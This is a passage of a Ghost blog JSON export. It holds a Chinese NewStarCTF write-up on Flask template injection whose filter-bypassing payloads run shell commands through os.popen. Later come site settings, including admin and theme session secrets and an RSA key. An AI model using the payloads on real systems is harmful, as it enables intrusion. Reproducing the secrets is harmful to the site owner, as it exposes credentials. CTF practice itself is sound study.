class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120154320.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><blockquote>然后继续测试</blockquote><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120154344.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><blockquote>表达式还是执行了</blockquote><blockquote>既然是第二弹，那肯定做了过滤</blockquote><blockquote>比如：class、subclass、init、globals、popen、空格、等等好多</blockquote><blockquote>绕过的方法也有很多，但在这题能有用的发现有两种如：大写转小写绕过和编码绕过（感觉编码绕过是万能的）（bushi</blockquote><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120160025.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><blockquote>然后掏出之前的写payload加点料，然后看一下flag是否在根目录，因为空格也过滤掉了，但是使用url编码的空格可以通过</blockquote><pre><code class=\"language-bash\">{{[123]['__CLASS__'|lower]['__MRO__'|lower][-1]['__SUBCLASSES__'|lower]()[117]['__INIT__'|lower]['__GLOBALS__'|lower]['__BUILTINS__'|lower]['__IMPORT__'|lower]('os')['POPEN'|lower]('ls%09/')['read']()}}\n</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202211201613715.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><blockquote>最后获取flag</blockquote><pre><code class=\"language-bash\">{{[123]['__CLASS__'|lower]['__MRO__'|lower][-1]['__SUBCLASSES__'|lower]()[117]['__INIT__'|lower]['__GLOBALS__'|lower]['__BUILTINS__'|lower]['__IMPORT__'|lower]('os')['POPEN'|lower]('tail%09/f*')['read']()}}\n</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120161145.png\" class=\"kg-image\" alt loading=\"lazy\"></figure>",
                        "comment_id": "637a1a29f7e27b274c0bdfae",
                        "plaintext": "0、知识点与工具\n\nFlask SSTI模板注入\n\n远程代码执行\n\n工具burpsuite\n\n回顾一下Python的内置属性\n    __class__：每个类都有的,表示当前类\n    __bases__：每一个类都有的一个属性，列出其基类\n    __mro__：列举类解析函数的执行顺序，也就是解析一个类构造函数的调用顺序\n    __subclasses__：获取所有子类集合\n    __init__：初始化一个类\n    __globals__：只读，以字典的形式返回函数所在的全局命名空间所定义的全局变量\n    __dict__：可写；以字典的形式返回命名空间所支持的任意自定义的函数属性\n    __builtins__：定义内建名称空间（Python在启动时会首先加载内建名称空间）\n    \t在控制台直接输入__builtins__时（Python2）会出现__builtin__\n    __import__\n    __code__：可写；返回已编译的函数对象\n    __name__：获取函数的名称\n    __doc__：用于获取函数的文档说明，如果没有，则返回 None\n    __module__：返回函数所在的模块，如果无则返回None\n    __defaults__：以元组的形式返回函数的默认参数，如果无默认参数则返回None\n    __closure__：以包含cell的元组形式返回闭包所包含的自由变量\n    \n    \n\n\n关于__builtins__\n\n * 在启动Python解释器或运行一个Python程序时\n * 内建名称空间都是从__builtins__模块中加载的\n * 只是__builtins__ 本身是对Python内建模块__builtin__的引用\n * 如果是在主模块__main__中，__builtins__直接引用__builtin__模块，此时模块名__builtins__与模块名``builtin指向的都是同一个模块，即`内建模块（这里要注意变量名和对象本身的区别）\n * 如果不是在主模块中，那么__builtins__只是引用了__builtin__.__dict__\n\n\n1、分析\n\nflask模板注入第二弹！\n\n首先页面也就是需要传入一个name参数，然后页面就会出现效果\n\n然后继续测试\n\n表达式还是执行了\n\n既然是第二弹，那肯定做了过滤\n\n比如：class、subclass、init、globals、popen、空格、等等好多\n\n绕过的方法也有很多，但在这题能有用的发现有两种如：大写转小写绕过和编码绕过（感觉编码绕过是万能的）（bushi\n\n然后掏出之前的写payload加点料，然后看一下flag是否在根目录，因为空格也过滤掉了，但是使用url编码的空格可以通过\n\n{{[123]['__CLASS__'|lower]['__MRO__'|lower][-1]['__SUBCLASSES__'|lower]()[117]['__INIT__'|lower]['__GLOBALS__'|lower]['__BUILTINS__'|lower]['__IMPORT__'|lower]('os')['POPEN'|lower]('ls%09/')['read']()}}\n\n\n最后获取flag\n\n{{[123]['__CLASS__'|lower]['__MRO__'|lower][-1]['__SUBCLASSES__'|lower]()[117]['__INIT__'|lower]['__GLOBALS__'|lower]['__BUILTINS__'|lower]['__IMPORT__'|lower]('os')['POPEN'|lower]('tail%09/f*')['read']()}}\n",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/d0c02c9fe4b162077c3a34ec28ee1026.png",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-20T12:14:33.000Z",
                        "updated_at": "2022-11-20T12:16:54.000Z",
                        "published_at": "2022-11-20T12:16:19.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "637b27ab55ed6957d56d28e0",
                        "uuid": "09c0da70-acaa-4da9-8767-334e4a074708",
                        "title": "归档",
                        "slug": "archive",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"bookmark\",{\"version\":\"1.0\",\"type\":\"bookmark\",\"url\":\"__GHOST_URL__/tag/newstarctf-gong-kai-sai-sai-dao/\",\"metadata\":{\"url\":\"__GHOST_URL__/tag/newstarctf-gong-kai-sai-sai-dao/\",\"title\":\"NewStarCTF 公开赛赛道 - 长瀞同学\",\"description\":null,\"author\":null,\"publisher\":\"长瀞同学\",\"thumbnail\":\"__GHOST_URL__/content/images/2022/11/02afdfca83c27bcfa44d2c9770f87933.png\",\"icon\":\"__GHOST_URL__/content/images/size/w256h256/format/jpeg/2022/11/0d2bcf4d9a9ddc0f95d54ce77cc4937d.jpg\"}}],[\"bookmark\",{\"version\":\"1.0\",\"type\":\"bookmark\",\"url\":\"__GHOST_URL__/tag/command-execution/\",\"metadata\":{\"url\":\"__GHOST_URL__/tag/command-execution/\",\"title\":\"命令执行 - 长瀞同学\",\"description\":null,\"author\":null,\"publisher\":\"长瀞同学\",\"thumbnail\":\"__GHOST_URL__/content/images/2022/11/02afdfca83c27bcfa44d2c9770f87933.png\",\"icon\":\"__GHOST_URL__/content/images/size/w256h256/format/jpeg/2022/11/0d2bcf4d9a9ddc0f95d54ce77cc4937d.jpg\"}}],[\"bookmark\",{\"version\":\"1.0\",\"type\":\"bookmark\",\"url\":\"__GHOST_URL__/tag/fileinclude/\",\"metadata\":{\"url\":\"__GHOST_URL__/tag/fileinclude/\",\"title\":\"FileInclude - 长瀞同学\",\"description\":null,\"author\":null,\"publisher\":\"长瀞同学\",\"thumbnail\":\"__GHOST_URL__/content/images/2022/11/02afdfca83c27bcfa44d2c9770f87933.png\",\"icon\":\"__GHOST_URL__/content/images/size/w256h256/format/jpeg/2022/11/0d2bcf4d9a9ddc0f95d54ce77cc4937d.jpg\"}}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<figure class=\"kg-card kg-bookmark-card\"><a class=\"kg-bookmark-container\" href=\"__GHOST_URL__/tag/newstarctf-gong-kai-sai-sai-dao/\"><div class=\"kg-bookmark-content\"><div class=\"kg-bookmark-title\">NewStarCTF 公开赛赛道 - 长瀞同学</div><div class=\"kg-bookmark-description\"></div><div class=\"kg-bookmark-metadata\"><img class=\"kg-bookmark-icon\" src=\"__GHOST_URL__/content/images/size/w256h256/format/jpeg/2022/11/0d2bcf4d9a9ddc0f95d54ce77cc4937d.jpg\" alt=\"\"><span class=\"kg-bookmark-author\">长瀞同学</span></div></div><div class=\"kg-bookmark-thumbnail\"><img src=\"__GHOST_URL__/content/images/2022/11/02afdfca83c27bcfa44d2c9770f87933.png\" alt=\"\"></div></a></figure><figure class=\"kg-card kg-bookmark-card\"><a class=\"kg-bookmark-container\" href=\"__GHOST_URL__/tag/command-execution/\"><div class=\"kg-bookmark-content\"><div class=\"kg-bookmark-title\">命令执行 - 长瀞同学</div><div class=\"kg-bookmark-description\"></div><div class=\"kg-bookmark-metadata\"><img class=\"kg-bookmark-icon\" src=\"__GHOST_URL__/content/images/size/w256h256/format/jpeg/2022/11/0d2bcf4d9a9ddc0f95d54ce77cc4937d.jpg\" alt=\"\"><span class=\"kg-bookmark-author\">长瀞同学</span></div></div><div class=\"kg-bookmark-thumbnail\"><img src=\"__GHOST_URL__/content/images/2022/11/02afdfca83c27bcfa44d2c9770f87933.png\" alt=\"\"></div></a></figure><figure class=\"kg-card kg-bookmark-card\"><a class=\"kg-bookmark-container\" href=\"__GHOST_URL__/tag/fileinclude/\"><div class=\"kg-bookmark-content\"><div class=\"kg-bookmark-title\">FileInclude - 长瀞同学</div><div class=\"kg-bookmark-description\"></div><div class=\"kg-bookmark-metadata\"><img class=\"kg-bookmark-icon\" src=\"__GHOST_URL__/content/images/size/w256h256/format/jpeg/2022/11/0d2bcf4d9a9ddc0f95d54ce77cc4937d.jpg\" alt=\"\"><span class=\"kg-bookmark-author\">长瀞同学</span></div></div><div class=\"kg-bookmark-thumbnail\"><img src=\"__GHOST_URL__/content/images/2022/11/02afdfca83c27bcfa44d2c9770f87933.png\" alt=\"\"></div></a></figure>",
                        "comment_id": "637b27ab55ed6957d56d28e0",
                        "plaintext": "NewStarCTF 公开赛赛道 - 长瀞同学长瀞同学命令执行 - 长瀞同学长瀞同学FileInclude - 长瀞同学长瀞同学",
                        "feature_image": null,
                        "featured": 0,
                        "type": "page",
                        "status": "draft",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-21T07:24:27.000Z",
                        "updated_at": "2022-11-21T07:28:35.000Z",
                        "published_at": null,
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    }
                ],
                "posts_authors": [
                    {
                        "id": "634c09d1b2ffd27df36d573c",
                        "post_id": "634c09d0b2ffd27df36d573b",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "634c09d1b2ffd27df36d573e",
                        "post_id": "634c09d1b2ffd27df36d573d",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "6371e3843d88f46264b10f44",
                        "post_id": "6371e3843d88f46264b10f43",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "637217cc3d88f46264b10f66",
                        "post_id": "637217cc3d88f46264b10f65",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "6372fc953d88f46264b11013",
                        "post_id": "6372fc953d88f46264b11012",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "63739936f7e27b274c0bd8d5",
                        "post_id": "63739935f7e27b274c0bd8d4",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "6374700af7e27b274c0bd9d5",
                        "post_id": "6374700af7e27b274c0bd9d4",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "6375d457f7e27b274c0bdb88",
                        "post_id": "6375d457f7e27b274c0bdb87",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "6376106df7e27b274c0bdc20",
                        "post_id": "6376106df7e27b274c0bdc1f",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "63763e6ef7e27b274c0bdcfb",
                        "post_id": "63763e6ef7e27b274c0bdcfa",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "63779472f7e27b274c0bdd9d",
                        "post_id": "63779472f7e27b274c0bdd9c",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "63798e87f7e27b274c0bdf81",
                        "post_id": "63798e87f7e27b274c0bdf80",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "6379b121f7e27b274c0bdf96",
                        "post_id": "6379b121f7e27b274c0bdf95",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "637a1a29f7e27b274c0bdfaf",
                        "post_id": "637a1a29f7e27b274c0bdfae",
                        "author_id": "1",
                        "sort_order": 0
                    },
                    {
                        "id": "637b27ab55ed6957d56d28e1",
                        "post_id": "637b27ab55ed6957d56d28e0",
                        "author_id": "1",
                        "sort_order": 0
                    }
                ],
                "posts_meta": [],
                "posts_products": [
                    {
                        "id": "6371e38d3d88f46264b10f47",
                        "post_id": "6371e3843d88f46264b10f43",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "6371e38d3d88f46264b10f48",
                        "post_id": "6371e3843d88f46264b10f43",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "637217d93d88f46264b10f69",
                        "post_id": "637217cc3d88f46264b10f65",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "637217d93d88f46264b10f6a",
                        "post_id": "637217cc3d88f46264b10f65",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "63721aab3d88f46264b10f90",
                        "post_id": "634c09d0b2ffd27df36d573b",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "63721aab3d88f46264b10f91",
                        "post_id": "634c09d0b2ffd27df36d573b",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "6372fc9c3d88f46264b11016",
                        "post_id": "6372fc953d88f46264b11012",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "6372fc9c3d88f46264b11017",
                        "post_id": "6372fc953d88f46264b11012",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "63739942f7e27b274c0bd8d8",
                        "post_id": "63739935f7e27b274c0bd8d4",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "63739942f7e27b274c0bd8d9",
                        "post_id": "63739935f7e27b274c0bd8d4",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "63747071f7e27b274c0bd9d8",
                        "post_id": "6374700af7e27b274c0bd9d4",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "63747071f7e27b274c0bd9d9",
                        "post_id": "6374700af7e27b274c0bd9d4",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "6375d461f7e27b274c0bdb8c",
                        "post_id": "6375d457f7e27b274c0bdb87",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "6375d461f7e27b274c0bdb8d",
                        "post_id": "6375d457f7e27b274c0bdb87",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "63761074f7e27b274c0bdc23",
                        "post_id": "6376106df7e27b274c0bdc1f",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "63761074f7e27b274c0bdc24",
                        "post_id": "6376106df7e27b274c0bdc1f",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "63763e96f7e27b274c0bdcfe",
                        "post_id": "63763e6ef7e27b274c0bdcfa",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "63763e96f7e27b274c0bdcff",
                        "post_id": "63763e6ef7e27b274c0bdcfa",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "63779476f7e27b274c0bdda0",
                        "post_id": "63779472f7e27b274c0bdd9c",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "63779476f7e27b274c0bdda1",
                        "post_id": "63779472f7e27b274c0bdd9c",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "63798e8bf7e27b274c0bdf84",
                        "post_id": "63798e87f7e27b274c0bdf80",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "63798e8bf7e27b274c0bdf85",
                        "post_id": "63798e87f7e27b274c0bdf80",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "6379b124f7e27b274c0bdf99",
                        "post_id": "6379b121f7e27b274c0bdf95",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "6379b124f7e27b274c0bdf9a",
                        "post_id": "6379b121f7e27b274c0bdf95",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "637a1a2ef7e27b274c0bdfb2",
                        "post_id": "637a1a29f7e27b274c0bdfae",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "637a1a2ef7e27b274c0bdfb3",
                        "post_id": "637a1a29f7e27b274c0bdfae",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "637a3eeb72340751fd7da59c",
                        "post_id": "634c09d1b2ffd27df36d573d",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "637a3eeb72340751fd7da59d",
                        "post_id": "634c09d1b2ffd27df36d573d",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    },
                    {
                        "id": "637b27bd55ed6957d56d28e4",
                        "post_id": "637b27ab55ed6957d56d28e0",
                        "product_id": "634c09cfb2ffd27df36d56cd",
                        "sort_order": 0
                    },
                    {
                        "id": "637b27bd55ed6957d56d28e5",
                        "post_id": "637b27ab55ed6957d56d28e0",
                        "product_id": "634c09cfb2ffd27df36d56ce",
                        "sort_order": 1
                    }
                ],
                "posts_tags": [
                    {
                        "id": "6372212b3d88f46264b10fcc",
                        "post_id": "634c09d0b2ffd27df36d573b",
                        "tag_id": "637220e03d88f46264b10fc8",
                        "sort_order": 0
                    },
                    {
                        "id": "637307783d88f46264b11085",
                        "post_id": "6372fc953d88f46264b11012",
                        "tag_id": "6373076e3d88f46264b11083",
                        "sort_order": 0
                    },
                    {
                        "id": "6373ae3ef7e27b274c0bd9c6",
                        "post_id": "63739935f7e27b274c0bd8d4",
                        "tag_id": "6373ae35f7e27b274c0bd9c4",
                        "sort_order": 1
                    },
                    {
                        "id": "6375bcf6f7e27b274c0bdb82",
                        "post_id": "6374700af7e27b274c0bd9d4",
                        "tag_id": "6375bcedf7e27b274c0bdb80",
                        "sort_order": 0
                    },
                    {
                        "id": "6375bd00f7e27b274c0bdb84",
                        "post_id": "63739935f7e27b274c0bd8d4",
                        "tag_id": "6375bcedf7e27b274c0bdb80",
                        "sort_order": 0
                    },
                    {
                        "id": "6375d461f7e27b274c0bdb8b",
                        "post_id": "6375d457f7e27b274c0bdb87",
                        "tag_id": "6375bcedf7e27b274c0bdb80",
                        "sort_order": 0
                    },
                    {
                        "id": "6375f310f7e27b274c0bdc13",
                        "post_id": "6375d457f7e27b274c0bdb87",
                        "tag_id": "6375f304f7e27b274c0bdc11",
                        "sort_order": 1
                    },
                    {
                        "id": "6375f38af7e27b274c0bdc19",
                        "post_id": "6371e3843d88f46264b10f43",
                        "tag_id": "6375f380f7e27b274c0bdc17",
                        "sort_order": 0
                    },
                    {
                        "id": "6375f3baf7e27b274c0bdc1d",
                        "post_id": "637217cc3d88f46264b10f65",
                        "tag_id": "6375f3b0f7e27b274c0bdc1b",
                        "sort_order": 0
                    },
                    {
                        "id": "637626c0f7e27b274c0bdcf4",
                        "post_id": "6376106df7e27b274c0bdc1f",
                        "tag_id": "6375bcedf7e27b274c0bdb80",
                        "sort_order": 0
                    },
                    {
                        "id": "637626dff7e27b274c0bdcf8",
                        "post_id": "6376106df7e27b274c0bdc1f",
                        "tag_id": "637626d5f7e27b274c0bdcf6",
                        "sort_order": 1
                    },
                    {
                        "id": "63763efff7e27b274c0bdd02",
                        "post_id": "63763e6ef7e27b274c0bdcfa",
                        "tag_id": "6375bcedf7e27b274c0bdb80",
                        "sort_order": 0
                    },
                    {
                        "id": "63763efff7e27b274c0bdd03",
                        "post_id": "63763e6ef7e27b274c0bdcfa",
                        "tag_id": "6373ae35f7e27b274c0bd9c4",
                        "sort_order": 1
                    },
                    {
                        "id": "63779497f7e27b274c0bdda3",
                        "post_id": "63779472f7e27b274c0bdd9c",
                        "tag_id": "6375bcedf7e27b274c0bdb80",
                        "sort_order": 0
                    },
                    {
                        "id": "6378943bf7e27b274c0bdf7e",
                        "post_id": "63779472f7e27b274c0bdd9c",
                        "tag_id": "63789421f7e27b274c0bdf7c",
                        "sort_order": 1
                    },
                    {
                        "id": "63798f02f7e27b274c0bdf8f",
                        "post_id": "63798e87f7e27b274c0bdf80",
                        "tag_id": "6375bcedf7e27b274c0bdb80",
                        "sort_order": 0
                    },
                    {
                        "id": "63798f02f7e27b274c0bdf90",
                        "post_id": "63798e87f7e27b274c0bdf80",
                        "tag_id": "63789421f7e27b274c0bdf7c",
                        "sort_order": 1
                    },
                    {
                        "id": "6379b1a6f7e27b274c0bdfab",
                        "post_id": "6379b121f7e27b274c0bdf95",
                        "tag_id": "6375bcedf7e27b274c0bdb80",
                        "sort_order": 0
                    },
                    {
                        "id": "6379b1a6f7e27b274c0bdfac",
                        "post_id": "6379b121f7e27b274c0bdf95",
                        "tag_id": "637626d5f7e27b274c0bdcf6",
                        "sort_order": 1
                    },
                    {
                        "id": "637a1ad1f7e27b274c0bdfbe",
                        "post_id": "637a1a29f7e27b274c0bdfae",
                        "tag_id": "6375bcedf7e27b274c0bdb80",
                        "sort_order": 0
                    },
                    {
                        "id": "637a1ad1f7e27b274c0bdfbf",
                        "post_id": "637a1a29f7e27b274c0bdfae",
                        "tag_id": "63789421f7e27b274c0bdf7c",
                        "sort_order": 1
                    },
                    {
                        "id": "637a1af6f7e27b274c0bdfc3",
                        "post_id": "637a1a29f7e27b274c0bdfae",
                        "tag_id": "637a1aecf7e27b274c0bdfc1",
                        "sort_order": 2
                    },
                    {
                        "id": "637a1b04f7e27b274c0bdfc5",
                        "post_id": "63779472f7e27b274c0bdd9c",
                        "tag_id": "637a1aecf7e27b274c0bdfc1",
                        "sort_order": 2
                    }
                ],
                "products": [
                    {
                        "id": "634c09cfb2ffd27df36d56cd",
                        "name": "Free",
                        "slug": "free",
                        "active": 1,
                        "welcome_page_url": null,
                        "visibility": "public",
                        "trial_days": 0,
                        "description": null,
                        "type": "free",
                        "currency": null,
                        "monthly_price": null,
                        "yearly_price": null,
                        "created_at": "2022-10-16T13:40:31.000Z",
                        "updated_at": "2022-10-16T13:40:31.000Z",
                        "monthly_price_id": null,
                        "yearly_price_id": null
                    },
                    {
                        "id": "634c09cfb2ffd27df36d56ce",
                        "name": "hide cats everyday",
                        "slug": "default-product",
                        "active": 1,
                        "welcome_page_url": null,
                        "visibility": "public",
                        "trial_days": 0,
                        "description": null,
                        "type": "paid",
                        "currency": "USD",
                        "monthly_price": 500,
                        "yearly_price": 5000,
                        "created_at": "2022-10-16T13:40:31.000Z",
                        "updated_at": "2022-11-14T06:33:37.000Z",
                        "monthly_price_id": null,
                        "yearly_price_id": null
                    }
                ],
                "products_benefits": [],
                "roles": [
                    {
                        "id": "634c09c3b2ffd27df36d56c3",
                        "name": "Administrator",
                        "description": "Administrators",
                        "created_at": "2022-10-16T13:40:19.000Z",
                        "updated_at": "2022-10-16T13:40:19.000Z"
                    },
                    {
                        "id": "634c09c3b2ffd27df36d56c4",
                        "name": "Editor",
                        "description": "Editors",
                        "created_at": "2022-10-16T13:40:19.000Z",
                        "updated_at": "2022-10-16T13:40:19.000Z"
                    },
                    {
                        "id": "634c09c3b2ffd27df36d56c5",
                        "name": "Author",
                        "description": "Authors",
                        "created_at": "2022-10-16T13:40:19.000Z",
                        "updated_at": "2022-10-16T13:40:19.000Z"
                    },
                    {
                        "id": "634c09c3b2ffd27df36d56c6",
                        "name": "Contributor",
                        "description": "Contributors",
                        "created_at": "2022-10-16T13:40:19.000Z",
                        "updated_at": "2022-10-16T13:40:19.000Z"
                    },
                    {
                        "id": "634c09c3b2ffd27df36d56c7",
                        "name": "Owner",
                        "description": "Blog Owner",
                        "created_at": "2022-10-16T13:40:19.000Z",
                        "updated_at": "2022-10-16T13:40:19.000Z"
                    },
                    {
                        "id": "634c09c3b2ffd27df36d56c8",
                        "name": "Admin Integration",
                        "description": "External Apps",
                        "created_at": "2022-10-16T13:40:19.000Z",
                        "updated_at": "2022-10-16T13:40:19.000Z"
                    },
                    {
                        "id": "634c09c3b2ffd27df36d56c9",
                        "name": "Ghost Explore Integration",
                        "description": "Internal Integration for the Ghost Explore directory",
                        "created_at": "2022-10-16T13:40:19.000Z",
                        "updated_at": "2022-10-16T13:40:19.000Z"
                    },
                    {
                        "id": "634c09c3b2ffd27df36d56ca",
                        "name": "DB Backup Integration",
                        "description": "Internal DB Backup Client",
                        "created_at": "2022-10-16T13:40:19.000Z",
                        "updated_at": "2022-10-16T13:40:19.000Z"
                    },
                    {
                        "id": "634c09c3b2ffd27df36d56cb",
                        "name": "Scheduler Integration",
                        "description": "Internal Scheduler Client",
                        "created_at": "2022-10-16T13:40:19.000Z",
                        "updated_at": "2022-10-16T13:40:19.000Z"
                    }
                ],
                "roles_users": [
                    {
                        "id": "634c09cfb2ffd27df36d56cc",
                        "role_id": "634c09c3b2ffd27df36d56c7",
                        "user_id": "1"
                    }
                ],
                "settings": [
                    {
                        "id": "634c09d3b2ffd27df36d5863",
                        "group": "core",
                        "key": "db_hash",
                        "value": "2427092c-4f7c-4e9f-9dfd-2409b17ad210",
                        "type": "string",
                        "flags": null,
                        "created_at": "2022-10-16T21:40:35.000Z",
                        "updated_at": "2022-10-16T21:40:35.000Z"
                    },
                    {
                        "id": "634c09d3b2ffd27df36d5864",
                        "group": "core",
                        "key": "routes_hash",
                        "value": "3d180d52c663d173a6be791ef411ed01",
                        "type": "string",
                        "flags": null,
                        "created_at": "2022-10-16T21:40:35.000Z",
                        "updated_at": "2022-10-16T13:40:37.000Z"
                    },
                    {
                        "id": "634c09d3b2ffd27df36d5865",
                        "group": "core",
                        "key": "next_update_check",
                        "value": "1669102024",
                        "type": "number",
                        "flags": null,
                        "created_at": "2022-10-16T21:40:35.000Z",
                        "updated_at": "2022-11-21T07:27:04.000Z"
                    },
                    {
                        "id": "634c09d3b2ffd27df36d5866",
                        "group": "core",
                        "key": "notifications",
                        "value": "[{\"dismissible\":true,\"location\":\"bottom\",\"status\":\"alert\",\"id\":\"637228723d88f46264b10fdc\",\"createdAtVersion\":\"5.22.10\",\"type\":\"warn\",\"message\":\"Ghost is currently unable to send email. See https://ghost.org/docs/concepts/config/#mail for instructions.\",\"seen\":false,\"addedAt\":\"2022-11-14T11:37:22.324Z\"}]",
                        "type": "array",
                        "flags": null,
                        "created_at": "2022-10-16T21:40:35.000Z",
                        "updated_at": "2022-11-14T11:37:22.000Z"
                    },
                    {
                        "id": "634c09d3b2ffd27df36d5867",
                        "group": "core",
                        "key": "version_notifications",
                        "value": "[]",
                        "type": "array",
                        "flags": null,
                        "created_at": "2022-10-16T21:40:35.000Z",
                        "updated_at": "2022-10-16T21:40:35.000Z"
                    },
                    {
                        "id": "634c09d3b2ffd27df36d5868",
                        "group": "core",
                        "key": "admin_session_secret",
                        "value": "b576b8f446f3a35c2d0fbc3e1e72f69963f7149265134f86eaa9a9b214e36b8e",
                        "type": "string",
                        "flags": null,
                        "created_at": "2022-10-16T21:40:35.000Z",
                        "updated_at": "2022-10-16T21:40:35.000Z"
                    },
                    {
                        "id": "634c09d3b2ffd27df36d5869",
                        "group": "core",
                        "key": "theme_session_secret",
                        "value": "26e6ecfdea591320b6ea1bce331cffb19a9f851403bcd75bb941389d3c291829",
                        "type": "string",
                        "flags": null,
                        "created_at": "2022-10-16T21:40:35.000Z",
                        "updated_at": "2022-10-16T21:40:35.000Z"
                    },
                    {
                        "id": "634c09d3b2ffd27df36d586a",
                        "group": "core",
                        "key": "ghost_public_key",
                        "value": "-----BEGIN RSA PUBLIC KEY-----\nMIGJAoGBAMXh5Is9p5r958CEOPgtoZ3g1QJ1AE+hFr1SoB0oXyUIJyE73B4HzaoqYi+LMhLI\nL/k/AxjNgx5yfjvSCC4UjaUz5c9hwsTlLyIBWTiJeX01xV+VAqrAUYADerzqH3V/RX644EHP\nKQSxL9v3PRDjAODODS0NPHPcpETFEA203uU3AgMBAAE=\n-----END RSA PUBLIC KEY-----\n",
                        "type": "string",
                        "flags": null,
                        "created_at": "2022-10-16T21:40:35.000Z",
                        "updated_at": "2022-10-16T21:40:35.000Z"
                    },
                    {
                        "id": "634c09d3b2ffd27df36d586b",
                        "group": "core",
                        "key": "ghost_private_key",
